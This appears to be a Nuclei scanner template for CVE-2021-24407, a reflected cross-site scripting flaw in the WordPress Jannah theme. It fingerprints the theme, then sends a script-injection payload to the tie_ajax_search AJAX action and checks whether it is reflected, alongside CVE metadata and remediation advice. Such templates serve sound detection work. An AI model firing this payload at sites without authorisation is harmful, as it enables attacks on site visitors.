flow: http(1) && http(2)
http:
- matchers:
  - condition: or
    internal: true
    type: word
    words:
    - /wp-content/themes/jannah/assets/
    - attachment-jannah-image-
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}


    action=tie_ajax_search&query[]=</script><script>alert(document.domain)</script>

    '
id: CVE-2021-24407
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:tielabs:jannah:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-24407
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.95445
    epss-score: 0.20956
  description: WordPress Jannah theme before 5.4.5 contains a reflected cross-site
    scripting vulnerability. It does not properly sanitize the 'query' POST parameter
    in its tie_ajax_search AJAX action.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: jannah
    vendor: tielabs
  name: WordPress Jannah Theme <5.4.5 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/fba9f010-1202-4eea-a6f5-78865c084153
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24407
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Update the Jannah Theme to version 5.4.5 or later, which includes
    proper input sanitization to mitigate the XSS vulnerability.

    '
  severity: medium
  tags: cve2021,cve,wordpress,xss,wp-theme,wpscan,tielabs,vuln
